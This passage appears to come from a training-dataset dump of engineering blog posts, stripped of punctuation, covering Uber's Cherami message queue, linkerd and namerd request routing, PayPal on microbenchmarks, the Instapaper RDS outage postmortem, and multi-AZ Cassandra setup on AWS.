a limited number of times  If the redelivery limit is reached  the message is published to a dead letter queue and the message is marked as acked so that the ack offset can advance  This way  no  poison pill  messages block the processing of other messages in the queue  The consumer group owner can manually examine messages in the DLQ  and then handle them in one of two ways  purging them or merging them  Purging them deletes the messages  and is appropriate when they are invalid  or if the have no value  e g  they were time sensitive   The owner can otherwise merge them back to the consumer group  which is appropriate when the consumer software has been fixed to handle the messages that previously could not be handled  or when the transient failure condition has subsided   4  Storage  Messages in Cherami are durably stored on disks  On the storage hosts  we chose RocksDB as our storage engine for performance and indexing features  and we use a separate RocksDB instance per extent with a shared LRU block cache  Messages are stored in the database with an increasing sequence number as the key  and the message itself as the value  Because the keys are always increasing  RocksDB optimizes its compaction so that we don t suffer from write amplification  When output host reads messages from an extent  it simply seeks to the ack offset for the consumer group it s serving  and iterates by the sequence number to read further messages   With RocksDB  we can also easily implement timer queues  which are queues where each message is associated with a delay time  In such a case  the message is only delivered after the specified delay  For timer queues  we construct the key to contain the delivery time in high order bits  and sequence number in low order bits  Since RocksDB provides a sorted iterator  the keys are iterated in order of delivery time  while the sequence number of the lower bits ensures uniqueness of the keys   System Architecture  Cherami consists of several different roles  In addition to the input  storage  and output roles we already introduced  there s controller  and frontend  A typical Cherami deployment consists of several instances of each role   Different roles can exist on the same physical host or even be linked into a single binary  At Uber  each role runs in an individual Docker container  Input  storage  and output form the data plane of the system  Controller and frontend handle control plane functions and metadata operations   Controller  Controller is the grand coordinator  the intelligence that coordinates all of the other components  It primarily determines when to create and where to place  to which input and which storage hosts  an extent  It also determines which output hosts handle the consumption for a consumer group   All data plane roles report load information to Controller via RPC calls  With this information  controller makes the placement decision and balance load  There are several instances of this controller role  one of them weakly elected the leader using Uber s Ringpop library for gossip and consistent hashing  Ringpop also performs distributed health check and membership functions   Frontend  Frontend hosts expose TChannel Thrift APIs that perform CRUD operations of queues and consumer groups  They also expose APIs for data plane routing purposes  When a producer wants to publish messages into a queue  it invokes the routing API to discover which input hosts contain the extents of the queue  Next  the producer connects to those input hosts using WebSocket connections and publishes messages in the established streams   Similarly  when a consumer wants to consume messages from a queue  it first invokes the routing API to discover which output hosts manage the consumption of extents of the queue  Then  the producer connects to those output hosts using WebSocket connections and pulls messages  When new extents are created  Cherami sends back a notification to the producer and consumer so that they can connect to new extents  We developed client side libraries to simplify these interactions   Cassandra and Queueing  Finally  Cherami stores metadata on Cassandra  which is separately deployed  Metadata contains information about a queue  all its Extents  and all the Consumer Group information such as ACK offsets per Extent per Consumer Group  We chose Cassandra not only because Cassandra is a highly available data storage system  but also because of its tunable consistency model  Such flexibility allows us to offer queues that can be either partition tolerant while not order preserving  AP queues   or order preserving  CP queues  but not available in the minor partition during such a partition event  The main difference in the handling of two types of queues is whether Extent creation requires conditional update operation   AP Queues  For AP queues  extent creation does not need Quorum level consistency in Cassandra  When a network partition occurs  Extents can be created on both sides of the partition  Let s call the partitions A and B  Producers in Partition A can publish into Extents in that partition  and Producers in Partition B can publish into Extents in Partition B  Therefore  writes are not blocked by network partition  For reads  Consumers in Partition A can only consume from Extents in that partition  and similar for Consumers in Partition B  However  when the network partition heals  Consumers are able to reach all Extents  The tradeoff here is that messages are eventually consistent  it is not possible to establish a global ordering of messages because Extents can be created anytime  anywhere  In our implementation  we use Cassandra consistency level  ONE  when we write the Extent metadata   CP Queues  For CP queues  Extent creation needs to be linearizable  in the case of a network partition  we must make sure that only one partition can create an Extent to succeed the previously sealed one  To ensure this  we use Cassandra s lightweight transaction so that if at the same time more than one Extent is created for any reason  only one can be used for a CP queue   Cherami  Summarized  Cherami is a competing consumer messaging queue that is durable  fault tolerant  highly available and scalable  We achieve durability and fault tolerance by replicating messages across storage hosts  and high availability by leveraging the append only property of messaging queues and choosing eventual consistency as our basic model  Cherami is also scalable  as the design does not have single bottleneck   Cherami was designed and built from the ground up in about six months in our Seattle engineering office  Currently  Cherami transports many hundred millions of tasks durably per day among Uber Engineering s many microservices  helping use cases such as post trip processing  fraud detection  user notification  incentive campaigns  and many other use cases   Cherami is completely written in Go  a language that makes building highly performant and concurrent system software a lot of fun  Additionally  Cherami uses several libraries that Uber has already open sourced  TChannel for RPC and Ringpop for health checking and group membership  Cherami depends on several third party open source technologies  Cassandra for metadata storage  RocksDB for message storage  and many other third party Go packages that are available on GitHub  We plan to open source Cherami in the near future   Editor Update January 3 2017  Cherami is now open sourced at the following links  github com uber cherami server   github com uber cherami client go   Xu Ning is an engineering manager and co wrote this article with Maxim Fateev  a staff software engineer  Both are based in Uber s Seattle engineering office   Photo Credits for Header   Paloma  by Pablo Iba ez  licensed under CC BY 2 0  Image cropped for header dimensions and color corrected   Photo Credits for intro pigeon image  United States Signal Corps via Smithsonian Institution  public domain,"[358 92 699 673 500 1422 1300 952 1351 1336 310]"
361,training-dataset/engineering/445.txt,engineering,When Services Stop Playing Well and Start Getting RealMicroservices allow engineering teams to move quickly to grow a product  assuming they don t get bogged down by the complexity of operating a distributed system  In this post  I ll show you how some of the hardest operational problems in microservices staging and canarying of deep services can be solved by introducing the notion of routing to the traffic layer   Looking back at my time as an infrastructure engineer at Twitter  from 2010 to 2015   I now realize that we were  doing microservices   though we didn t have that vocabulary at the time   We used what I now understand to be a bad word SOA    Buzzwords aside  our motivations were the same as those doing microservices today  We needed to allow engineering teams to operate independently to control their own deploy schedules  on call rotations  availability  and scale  These teams needed the flexibility to iterate and scale quickly and independently without taking down the site   Having worked on one of the world s largest microservice applications through its formational years  I can assure you that microservices are not magical scaling sprinkles nor flexibility  nor security  nor reliability sprinkles  It s my experience that they are considerably more difficult to operate than their monolithic counterparts  The tried and true tools we re used to configuration management  log processing  strace  tcpdump  etc prove to be crude and dull instruments when applied to microservices  In a world where a single request may touch hundreds of services  each with hundreds of instances  where do I run tcpdump  Which logs do I read  If it s slow  how do I figure out why  When I want to change something  how do I ensure these changes are safe   We replaced our monolith with micro services so that every outage could be more like a murder mystery    Honest Status Page   honest_update  October 7  2015  When Twitter moved to microservices  it had to expend hundreds  thousands   of staff years just to reclaim operability  If every organization had to put this level of investment into microservices  the vast majority of these projects would simply fail  Thankfully  over the past few years  open source projects have emerged to ease some of the burden of microservice operations  projects that abstract the details of datacenters and clouds  or offer visibility into a system s runtime state  or make it easier to write services  But this still isn t a complete picture of what s needed to operate microservices at scale  While there are a variety of good tools that help teams go from source code to artifact to cloud  operators don t have nearly enough control over how these services interact once they re running  At Twitter  we learned that we need tools that operate on the communication between services RPC   It s this experience that motivated linkerd  pronounced  linker dee    a service mesh designed to give service operators command   control over traffic between services  This encompasses a variety of features including transport security  load balancing  multiplexing  timeouts  retries  and routing   In this post  I ll discuss linkerd s approach to routing  Classically  routing is one of the problems that is addressed at Layers 3 and 4 TCP IP with hardware load balancers  BGP  DNS  iptables  etc  While these tools still have a place in the world  they re difficult to extend to modern multi service software systems  Instead of operating on connections and packets  we want to operate on requests and responses  Instead of IP addressees and ports  we want to operate on services and instances   In fact  we ve found request routing to be a versatile  high leverage tool that can be employed to solve some of the hardest problems that arise in microservices  allowing production changes to be safe  incremental  and controllable   routing in linkerd  linkerd doesn t need to be configured with a list of clients  Instead it dynamically routes requests and provisions clients as needed  The basic mechanics of routing involve three things   a logical name  describing a request  a concrete name  describing a service  i e  in service discovery   and a delegation table  dtab   describing the mapping of logical to concrete names   linkerd assigns a logical name to every request it processes  for example  svc users add    http 1 1 GET users add or  thrift userService addUser   Logical names describe information relevant to the application but not its infrastructure  so they typically do not describe any details about service discovery  e g  etcd  consul  ZooKeeper   environment  e g  prod  staging   or region  e g  us central 1b  us east 1    These sorts of details are encoded in concrete names  Concrete names typically describe a service discovery backend like ZooKeeper  etcd  consul  DNS  etc  For example      inet users example com 8080 names an inet address   names an inet address   io l5d k8s default thrift users names a kubernetes service   names a kubernetes service   io l5d serversets users prod thrift names a ZooKeeper serverset   This  namer  subsystem is pluggable so that it can be extended to support arbitrary service discovery schemes   delegation  The distinction between logical and concrete names offers two real benefits   Application code is focused on business logic users  photos  tweets  etc and not operational details Backends can be determined contextually and  with the help of namerd  dynamically   The mapping from logical to concrete names is described by a delegation table  or Dtab  For example  linkerd can assign names to HTTP requests in the form  http 1 1  METHOD   HOST  using the io l5d methodAndHost identifier   Suppose we configure linkerd as follows   namers    kind  io l5d experimental k8s authTokenFile   var run secrets kubernetes io serviceaccount token routers    protocol  http servers    port  4140 identifier  kind  io l5d methodAndHost dstPrefix   http dtab     srv     io l5d k8s default http    host     srv    http 1 1       host    In this configuration  a logical name like  http 1 1 GET users is delegated to the concrete name  io l5d k8s default http users through rewrites   From Delegation To  http 1 1 GET users  http 1 1       host  host users  host users  host     srv  srv users  srv users  srv     io l5d default http  io l5d k8s default http users      Finally  the concrete name   io l5d k8s default http users   addresses a service discovery system in this case  the Kubernetes master API  The io l5d k8s namer expects names in the form namespace   port   service  so linkerd load balancers over the addresses on the http port of the users service in the default namespace   Multiple namers may be combined to express logic such as find this service in ZooKeeper  but if it s not there fall back to the local filesystem   namers    kind  io l5d fs rootDir   path to services   kind  io l5d serversets zkAddrs    host  127 0 0 1 port  2181 routers    protocol  http servers    port  4140 identifier  kind  io l5d methodAndHost dstPrefix   http dtab     srv     io l5d fs    srv     io l5d serversets path to services    host     srv    http 1 1       host    The  srv delegations are combined to construct a fallback so that if a serverset cannot be found  lookups will be performed against the filesystem namer   per request overrides  This concept of contextual resolution can be extended to alter how individual requests are routed   Suppose you want to stage a new version of a service and you want to get an idea how the application will behave with the new version  Assume that this service isn t directly user facing  but has other services that call it a  users  service is generally a good example  You have a few options   Just deploy it to production   YOLO Deploy staging versions of all of the services that call your service   Neither of these options are particularly manageable  The former causes user facing problems  The latter becomes complex and cumbersome you may not have the access or tooling needed to deploy new configurations of all of the services that call you   Happily  the routing capabilities we have with linkerd allow us to do ad hoc staging  We can extend the delegation system described above on an individual request to stage a new version of the users service without changing any of its callers  For example     curl  H  l5d dtab   host users   srv users v2  https   example com   This would cause all services that would ordinarily send requests to  srv users to instead send requests to  srv users v2   Only on this request  Across all services   And this isn t just limited to curl commands  this sort of thing can also easily be supported by browser plugins   This approach greatly reduces the overhead of staging new versions of services in a complex microservice   dynamic routing with namerd  I ve described how we can configure linkerd with a static delegation table  But what if we want to change routing policy at runtime  What if we want to use a similar approach that we used for staging to support  canary  or  blue green   deploys  Enter namerd   namerd is a service that allows operators to manage delegations  It fronts service discovery systems so that linkerd does not need to communicate with service discovery directly linkerd instances resolve names through namerd  which maintains a view of service discovery backends   namerd is configured with   A  pluggable  storage backend  e g  ZooKeeper or etcd    Namers  that inform namerd how to perform service discovery   Some external interfaces usually a control interface so that operators may update delegations  and a sync interface for linkerd instances   linkerd s configuration is then simplified to be something like the following   routers    protocol  http servers    port  4180 interpreter  kind  io l5d namerd namespace  web dst     inet namerd example com 4290 identifier  kind  io l5d methodAndHost dstPrefix   http  And namerd has a configuration like     pluggable dtab storage    for this example we ll just use an in memory version  storage  kind  io buoyant namerd storage inMemory   pluggable namers  for service discovery  namers    kind  io l5d fs       kind  io l5d serversets     interfaces    used by linkerds to receive updates   kind  thriftNameInterpreter ip  0 0 0 0 port  4100   used by  namerctl  to manage configuration   kind  httpController ip  0 0 0 0 port  4180  Once namerd is running and linkerd is configured to resolve through it  we can use the namerctl command line utility to update routing dynamically   When namerd first starts  we create a basic dtab  called web  as follows     namerctl dtab create web     EOF  srv     io l5d fs    srv     io l5d serversets path to services    host     srv    http 1 1       host   EOF  For example  to  canary test  our users v2 service  we might send 1  of real production traffic to it     namerctl dtab update web     EOF  srv     io l5d fs    srv     io l5d serversets path to services    host     srv    http 1 1       host    host users    1    srv users v2   99    srv users   EOF  We can control how much traffic the new version gets by altering weights  For instance  to send 25  of users traffic to users v2  we update namerd with     namerctl dtab update web     EOF  srv     io l5d fs    srv     io l5d serversets path to services    host     srv    http 1 1       host    host users    1    srv users v2   3    srv users   EOF  Finally  when we re happy with the performance of the new service  we can update namerd to prefer the new version as long as it s there  but to fall back to the original version should it disappear     namerctl dtab update web     EOF  srv     io l5d fs    srv     io l5d serversets path to services    host     srv    http 1 1       host    host users     srv users v2    srv users   EOF  Unlike linkerd  namerd is still a fairly new project  We re iterating quickly to make sure it s easy to operate and debug  As it matures  it will give operators a powerful tool to control the services at runtime  It can be integrated with deployment tools to do safe  gradual  managed rollouts  and rollbacks  of new features  It will help teams move features out of a monolith into microservices  And it will improve debuggability of systems  I ve seen first hand how powerful traffic level tooling can be  and I m excited to introduce these features to the open source community   Just like linkerd  namerd is open source under the Apache License v2  We re excited about releasing it to the community  and we hope you get involved with what we re building at Buoyant  It s going to be awesome   try it for yourself  We ve published the linkerd examples repository with examples of how to run linkerd   namerd on Kubernetes and Mesos   Marathon  These repositories should have everything you need to get up and routing   If you have any questions along the way  please don t hesitate to ask us on slack linkerd io   Fixed the repo links above,"[361 1351 92 1297 1347 673 773 778 1403 952 234]"
370,training-dataset/engineering/174.txt,engineering,Benching MicrobenchmarksIn under one week  Statistics for Software flew past 10 Myths for Enterprise Python to become the most visited post in the history of the PayPal Engineering blog  And that s not counting the Japanese translation  Taken as an indicator of increased interest in software quality  this really floats all boats   That said  there were enough emails and comments to call for a quick followup about one particularly troubling area   The saying in software goes that there are lies  damned lies  and software benchmarks   Yes  quantiles  histograms  and other fundamentals covered in Statistics for Software can certainly be applied to improve benchmarking  One of the timely inspirations for the post was our experience with a major network appliance vendor selling 5 figure machines  without providing or even measuring latency in quantiles  Just throughput averages   To fix this  we gave them a Jupyter notebook that drove test traffic  and a second notebook provided the numbers they should have measured  We ve amalgamated elements of both into a single notebook on PayPal s Github  Two weeks later they had a new firmware build that sped up our typical traffic s 99th percentile by two orders of magnitude  Google  Amazon  and their other customers will probably get the fixes in a few weeks  too  Meanwhile  we re still waiting on our gourmet cheese basket   Even though our benchmarks were simple  they were specific to the use case  and utilized robust statistics  But even the most robust statistics won t solve the real problem  systematic overapplication of one or two microbenchmarks across all use cases  We must move forward  to a more modern view   Any framework or application branding itself as performant must include measurement instrumentation as an active interface  One cannot simply benchmark once and claim performance forever  Applications vary widely  There is no performance critical situation where measurement is not also necessary  Instead  we see a glut of microframeworks  throwing out even the most obvious features in the name of speed   Speed is not a built in property  Yes  Formula 1 race cars are fast and yes  F1 designers are very focused on weight reduction  But they are not shaving off grams to set weight records  The F1 engineers are making room for more safety  metrics  and alerting  Once upon a time  this was not possible  but technology has come a long way since last century  So it goes with software   To honestly claim performance on a featuresheet  a modern framework must provide a fast  reliable  and resource conscious measurement subsystem  as well as a clear API for accessing the measurements  These are good uses of your server cycles  PayPal s internal Python framework does all of this on top of SuPPort  faststat  and lithoxyl   Microbenchmarks were already showing signs of fatigue  Strike one was the frequent lack of reproducibility  Strike two came when software authors began gaming the system  changing what was written to beat the benchmark  Now  microbenchmarks have officially struck out  Echos and ping pongs are worth less than their namesakes   Standard profiling and optimization techniques  such as those chronicled in Enterprise Software with Python  still have their place for engineering performance  But those measurements are provisional and temporary  Today  we need software that provides idiomatic facilities for live measurement every individual system s true performance,"[370 915 1042 414 886 778 596 673 794 946 1336]"
373,training-dataset/engineering/1145.txt,engineering,Instapaper Outage Cause   Recovery   Making Instapaper   MediumInstapaper Outage Cause   Recovery  The Instapaper service experienced an extended outage between Wednesday  February 9 at 12 30PM PT through Thursday  February 10 at 7 30pm PT  We brought the Instapaper service back up with limited access to archives as a short term solution while we worked to restore the service completely  Today  February 14  we completed the full recovery of the service   The critical system that failed was our MySQL database  which we run as a hosted solution on Amazon s Relational Database Service  RDS   Here we ll cover what went wrong  how we resolved the issue and what we re doing to improve reliability moving forward   Root cause  In short  the data failure was caused by a 2TB file size limit for RDS instances created before April 2014  On Wednesday  February 9 at 12 30PM PT our  bookmarks  table that stores articles saved by Instapaper users exceeded the 2TB file size limit  Subsequent attempts to insert new entries into the bookmarks table began to throw the following error   The reason this limitation exists is because MySQL RDS instances created before April 2014 used an ext3 filesystem which has a 2TB file size limit  Instances created after April 2014 are backed by an ext4 filesystem and subject to a 6TB file size limit   Instapaper RDS history  In April 2013  betaworks acquired Instapaper from Marco Arment  After the acquisition  we moved Instapaper from Softlayer to Amazon Web Services because all betaworks companies run on AWS so the engineers have expertise in that platform  To perform the migration  betaworks worked with two of their regular devops contractors  After the migration  operations were handed off to the newly formed Instapaper team  and operating responsibilities fell on our director of engineering  After our director of engineering left the company in October 2014  I took over backend operations   Our original instance  created in June 2013  was experiencing some performance issues during its backup window in early 2015  AWS support confirmed we were running on older hardware and an older version MySQL v5 6 18  If we upgraded to a more recent version  v5 6 19    according to AWS  the issue would be resolved   In March 2015  we created a read replica of our June 2013 RDS instance  upgraded the MySQL version and performed the cutover switch in the middle of the night with minimal downtime   roughly 5 minutes  Although this instance was created after April 2014  it was created as a read replica from the original June 2013 RDS instance  and  as such  inherited the same filesystem and 2TB file size limitation   Prevention  Without knowledge of the pre April 2014 file size limit  it was difficult to foresee and prevent this issue  As far as we can tell  there s no information in the RDS console in the form of monitoring  alerts or logging that would have let us know we were approaching the 2TB file size limit  or that we were subject to it in the first place  Even now  there s nothing to indicate that our hosted database has a critical issue   If we ever had knowledge of the file size limit  it likely left with the 2013 era betaworks contractors that performed the Softlayer migration  As far as we can tell  there are only two ways that we  as RDS customers  could have prevented this issue   First  we could have performed a complete dump of the database to disk  and then restored the database to a new RDS instance  In this scenario  we d likely need to work directly with Amazon to set the new RDS instance as a read replica of the old one and then perform the cutover   The other option would have been to set up a read replica running Amazon Aurora  Amazon s managed SQL compatible database system  We d previously considered migrating to Aurora  mostly because of the cost savings   however Aurora runs exclusively within a VPC  and Instapaper still runs on EC2 classic   Ultimately  it s unlikely that we would have performed either of those operations without knowledge of the limitation   Backups  One of the great features of RDS is automated  daily backups of your database instances  We store 10 days of backups for our MySQL database  However  since those backups are all filesystem snapshots  they re also subject to the 2TB file size limit   Limited service restoration  We didn t have a good disaster recovery plan in the event our MySQL instance failed with a critical filesystem issue that all of our backups were also subject to   After a long phone call with AWS support and discussing the limitation with Pinterest s Site Reliability engineers  we understood that our only path forward was to rebuild our 2 5TB database using a complete dump and restore  As quickly as possible  Pinterest s SRE team guided us through dumping Instapaper s production database to a 5 5TB RAID 0 disk provided by an i2 8xlarge instance   When it became clear the dump would take far too long  first effort took 24 hours  second effort with parallelization took 10 hours   we began executing on a contingency plan to get an instance in a working state with limited access to Instapaper s archives  This short term solution launched into production after 31 hours of downtime  The total time to create that instance and launch it into production was roughly six hours   Given that we didn t have a plan for this type of event  we didn t have a good understanding of the time required to dump and restore our database  Our initial estimate for the database dump was six to eight hours  However  we made that estimate using the number of rows  and later learned the first 25 percent of Instapaper bookmarks account for only 10 percent of overall data  We could have drastically cut our initial day of downtime if we understood that rebuilding the database would be a multi day effort and that we needed to launch directly into limited service restoration   Data restoration  Once the service was back up and the data dumps completed  the next step was to import all of the dumps into an instance that wasn t subject to the 2TB file size limit  We worked closely with RDS engineers throughout the weekend to accomplish this with two parallel workflows   Set up an Aurora read replica of the old database  We agreed using Aurora was risky because we hadn t thoroughly tested it against the Instapaper codebase  but it was very low friction to set up  The read replica completed in about 24 hours  Create a new MySQL RDS instance  import all of the data without secondary indexes  8 hours  and create three secondary indexes after the data was imported  each secondary index took roughly 16 hours   At the time of this post  the last secondary index was still being created   After realizing that the secondary index creation was taking an unacceptably long time  one of the Amazon engineers mounted an ext4 filesystem to our failed production database and performed an rsync between the ext3 filesystem and ext4 filesystem  The rsync ran in roughly 8 hours  which ultimately got us a new  ext4 backed database instance with all of the data and indexing restored   Syncing with temporary production database  Using the binary logs from the temporary production database  with limited archives   RDS engineers set up the new ext4 backed database with row based replication to the temporary production database in order to sync up with the changes made between Thursday and Monday  The total time for this replication was roughly three hours   Full service restoration  Once we had the new ext4 backed database with full data and indexes synced up to the temporary production database  the final step was to promote the new database to master and deploy the application code to point to the new database   We performed the restoration without losing any of our users  older articles  changes made to more recent articles or articles saved after recovering from the outage   Reflections  This is any web application developer s worst nightmare  A filesystem based limitation we weren t aware of and had no visibility into rendered not only our production database useless  but all our backups  too  Our only recourse was to restore the data to an entirely new instance on a new filesystem  This was further complicated by the fact that our only interface into the hosted instances is MySQL  which made filesystem level solutions like rsync impossible without the direct assistance from Amazon engineers   Even if we had executed perfectly  from the moment we diagnosed the issue to the moment we had a fully rebuilt database  the total downtime would have been at least 10 hours  Of course  that s significantly less than the 31 hours of total downtime and five days of limited access  but we d like to illustrate the severity of this type of issue even in a perfect world   We re firm in our belief that this issue was difficult to foresee and prevent  but the lack of a disaster recovery plan for this type of issue resulted in longer downtimes and recovery times than necessary  Additionally  there were several steps we could have taken from a communications perspective  both internally at Pinterest and with the Amazon Web Services team  in order to better leverage the resources at our disposal   Action items  As part of our retrospective process at Pinterest  we re defining a better workflow for system wide Instapaper outages that escalate issues immediately to Pinterest s Site Reliability Engineering team   Additionally  we re going to be more aggressive with testing our MySQL backups  We used to test backups every three months  and now we ll test every month   Neither of the above action items would have prevented this issue  but they ll help accelerate our response times in the event of an outage and are good practices   Relational database service  We ll continue to use Amazon s Relational Database Service for now  While it s frustrating to experience an issue without warning or visibility  RDS has been a reliable and robust service for Instapaper for several years  and handled snapshots  failovers  read replication and other tasks without any engineering overhead from the Instapaper team   Additionally  the RDS team has been incredibly helpful in expediting our full recovery  They even took a feature request from us with respect to adding some additional information about ext3 backed databases   Accountability  I take full responsibility for the incident and the downtime  While the information about the 2TB limitation wasn t directly available to me  it s my responsibility to understand the limitations of the technologies I m using in my day to day operations  even if those technologies are hosted by another company  Additionally  I take responsibility for the lack of an appropriate disaster recovery plan and will be working closely with Pinterest s Site Reliability Engineering team to ensure we have a process in place to recover from this type of failure in the event it ever happens again,"[373 699 1351 946 1295 1336 1403 902 613 673 204]"
393,training-dataset/engineering/1501.txt,engineering,How to Setup a Highly Available Multi AZ Cassandra Cluster on AWS EC2Monday  August 1  2016 at 8 56AM  This is a guest post by Alessandro Pieri  Software Architect at Stream  Try out this 5 minute interactive tutorial to learn more about Stream s API   Originally built by Facebook in 2009  Apache Cassandra is a free and open source distributed database designed to handle large amounts of data across a large number of servers  At Stream  we use Cassandra as the primary data store for our feeds  Cassandra stands out because it s able to   Shard data automatically  Handle partial outages without data loss or downtime  Scales close to linearly  If you re already using Cassandra  your cluster is likely configured to handle the loss of 1 or 2 nodes  However  what happens when a full availability zone goes down   In this article you will learn how to setup Cassandra to survive a full availability zone outage  Afterwards  we will analyze how moving from a single to a multi availability zone cluster impacts availability  cost  and performance   Recap 1  What Are Availability Zones   AWS operates off of geographically isolated locations called regions  Each region is composed of a small amount  usually 3 or 4  physically independent availability zones  Availability zones are connected with a low latency network  while regions are completely independent of each other  as shown in the diagram below   In order to achieve high availability  AWS resources should be hosted in multiple availability zones  Hosting in multiple availability zones allows you to ensure that if one goes down  your app will stay up and running   Recap 2  Cassandra and High Availability  One of the primary benefits of Cassandra is that it automatically shards your data across multiple nodes  It even manages to scale almost linearly  so doubling the number of nodes give you nearly double the capacity   Cassandra has a setting called  replication factor  that defines how many copies of your data should exist  If your replication factor is set to 1 and a node goes down  you will lose your data because it was only stored in 1 place  A replication factor of 3 will insure that your data is always stored on 3 different nodes  ensuring that your data is safe when a single node breaks down   Configuring Cassandra for multi AZ availability  Now that we ve covered the basics  let s explain how to setup Cassandra for multi AZ availability   If you re new to Cassandra and want to learn how to setup your own cluster  this article is a good starting point   Part 1   The Snitch  As a first step we have to make sure Cassandra knows which region and availability zone it s in  This is handled by the  snitch   which keeps track of the information related to the network topology  Cassandra provides several built in snitches  The Ec2Snitch and Ec2MultiRegionSnitch work well for AWS  The Ec2Snitch is meant for a single region deployment  and the Ec2MultiRegionSnitch is meant for clusters that span multiple regions   Cassandra understands the concept of a data center and a rack  The EC2 snitches treat each EC2 region as a data center and the availability zone as the rack   You can change the Snitch setting in cassandra yaml  Beware that changing the Snitch setting is a potentially destructive operations and should be planned with care  Read the Cassandra documentation about changing the Snitch setting       IF YOU CHANGE THE SNITCH AFTER DATA IS INSERTED INTO THE CLUSTER    YOU MUST RUN A FULL REPAIR  SINCE THE SNITCH AFFECTS WHERE REPLICAS   ARE PLACED      Out of the box  Cassandra provides         Ec2Snitch    Appropriate for EC2 deployments in a single Region  Loads Region   and Availability Zone information from the EC2 API  The Region is   treated as the Datacenter  and the Availability Zone as the rack    Only private IPs are used  so this will not work across multiple   Regions      Ec2MultiRegionSnitch    Uses public IPs as broadcast_address to allow cross region   connectivity   Thus  you should set seed addresses to the public   IP as well   You will need to open the storage_port or   ssl_storage_port on the public IP firewall   For intra Region   traffic  Cassandra will switch to the private IP after   establishing a connection       You can use a custom Snitch by setting this to the full class name   of the snitch  which will be assumed to be on your classpath  endpoint_snitch  Ec2Snitch  The above is a snippet from cassandra yaml  Part 2   The Replication Factor  The replication factor determines the number of replicas that should exist in the cluster  Replication strategy  also known as replica placement strategy  determines how replicas are distributed across the cluster  Both settings are keyspace properties   By default Cassandra uses the  SimpleStrategy  replication strategy  This strategy places replicas in the cluster ignoring which region or availability zone it s in  The NetworkTopologyStrategy is rack aware and is designed to support multi datacenter deployments     CREATE KEYSPACE mykeyspace WITH replication      class    NetworkTopologyStrategy    us east    3      In the above code snippet we ve declared a keyspace called  mykeyspace  with a NetworkReplicationStrategy which will place the replicas in the  us east  datacenter only  with a replication factor of 3   To change an existing keyspace you can use the example below  Beware that changing the replication strategy of a running Cassandra s cluster is a sensitive operation  Read the full documentation     ALTER KEYSPACE mykeyspace WITH REPLICATION      class     NetworkTopologyStrategy    us east     3        Part 3   Consistency levels  When you read or write from Cassandra  you have the ability to specify the  consistency level  on the client side  In other words  you can specify how many nodes in the Cassandra cluster are required to agree before a read or write request is valid   If you ask for a higher consistency level than Cassandra is able to answer with nodes in the local availability zone  it will query the other zones  To stay up during an availability zone outage  you need to use a consistency level that the remaining nodes are able to satisfy  The next section will discuss failure scenarios and consistency levels in more detail   Handling AZ s  Outages  How a Cassandra cluster behaves when an availability zone goes down depends on several factors   Scale of the failure  how many AZs are down   Number of AZs used by the cluster  Replication factor  Consistency level  Let s have a look at the diagram below  which shows a couple of scenarios   Figure 2  How consistency level affects availability  In the first scenario shown on the left we show a cluster running on 2 AZs with 6 nodes  3 per AZ  and a RF 2  When 1 AZ goes down  half of our cluster will be offline  With 2 AZs and a RF 2  we will have the guarantee that our entire dataset is still present on at least 1 node  As you can see in the table next to the cluster diagram  the outcome of a query depends on the requested consistency level  For example  a query with CL ONE will succeed because we still have at least 1 node available  On the other hand  queries with higher CL requirements such as  QUORUM and ALL will always fail because they both require responses from 2 nodes   In the second scenario  we run Cassandra with 9 nodes on 3 different AZs and a replica factor of 3  With this deployment  our cluster is clearly more resilient in the event of 1 AZ failure  Cassandra will still be able to satisfy queries with CL QUORUM   It is worth noting that in the event of an availability zone outage  the capacity left in service for the 2 clusters is different  With the first cluster setup you lose 50  of the capacity  while the second setup only affects 33  of the capacity   How Much Latency Is Introduced by a Multi AZs Setup   Estimating query latency introduced by the multi AZ setup is not easy due to the nature of Cassandra and the number of factors that fluctuate in a cloud environment  e g  network latency  disk I O  host utilization  etc     For our tests we used the cassandra stress tool to generate read and write load on clusters running on single and multiple AZs  In order to keep the variance as low as possible  and to lower the deviation on disk I O  we used instances with ephemeral storage instead of network attached storage  EBS    We then came up with two test scenarios   The first used a cluster of 6 i2 xlarge instances  AWS network performance    moderate   and was running without enhanced networking     Median 95th percentile WRITE Single AZ 1 0 2 5 Multi AZ  3 AZs  1 5 2 8 READ Single AZ 1 0 2 6 Multi AZ  3 AZs  1 5 23 5  Table 1  Scenario 1  performance test Single AZ vs Multi AZ  time in milliseconds   Setup  Cassandra 2 0 15  RF 3  CL 1  The second scenario used a cluster of 6 i2 2xlarge  AWS network performance    high    with enhanced networking turned on     Median 95th percentile WRITE Single AZ 0 9 2 4 Multi AZ  3 AZs  1 1 2 3 READ Single AZ 0 7 1 5 Multi AZ  3 AZs  1 0 1 9  Table 2  Scenario 2  performance test Single AZ vs Multi AZ  time in milliseconds   Setup  Cassandra 2 0 15  RF 3  CL 1  Interesting enough  networking performance varies between the two instance types  When using i2 2xlarge with enhanced networking enabled  we saw very little difference between single AZ and multi AZ deployments  Therefor we recommend enabling enhanced networking and selecting an instance types with  high  network performance   Another interesting fact is that Cassandra reads are   to a certain extent   rack aware  When coordinating a query  Cassandra nodes will route the request to the peer with lowest latency  This feature is called  dynamic snitching  and has been part of Cassandra since version 0 6 5   Thanks to dynamic snitching  most of the read queries to Cassandra do not  hit  nodes on different availability zones and give Cassandra some sort of rack awareness  We could reproduce this behavior on our read tests as shown in the following chart   Figure 1  Number of local read requests per node on multi AZ setup  Replicas in the same AZ are preferred  Set up  6 nodes cluster spanning across 3 Azs  Read are performed with Consistency Level ONE  Figure 1 shows how 10M read requests are distributed across the cluster  As you can see  most requests are handled within the local availability zone   About enhanced networking  AWS offers enhanced networking on their most recent instance families  Using enhanced networking results in consistently lower inter instance latency  For more information about this topic  please follow this link   Guidelines for Deciding the Number of Availability Zones to Use  Cassandra can be configured in such a way that every availability zone has at least 1 entire copy of the dataset  Cassandra refers to this scenario as making an AZ self contained  To achieve this  you need to place your nodes across a number of AZs that is less or equal your replication factor  It is also recommended to have the same number of nodes running on every AZ   In general it is beneficial to have   Availability Zones    Replication Factor  At Stream we ve chosen to use a replication factor of 3 with 3 different availability zones  This ensures that every availability zone has a copy of the data  and that we have enough capacity left to handle read and write requests in the unlikely event of an AZ outage   Conclusion  Cassandra is an amazing database  At Stream we rely heavily on it to keep the feeds running for tens of millions of end users  In short  we do so because Cassandra has the ability to   Shard data automatically  Handle instance failures without data loss or downtime  Scale  almost  linearly  In this post we ve explained how to configure Cassandra in a highly available Multi AZ setup on AWS EC2  The costs and performance are almost identical to a single availability zone deployment  A few key takeaways,"[393 500 699 946 1336 204 615 310 673 889 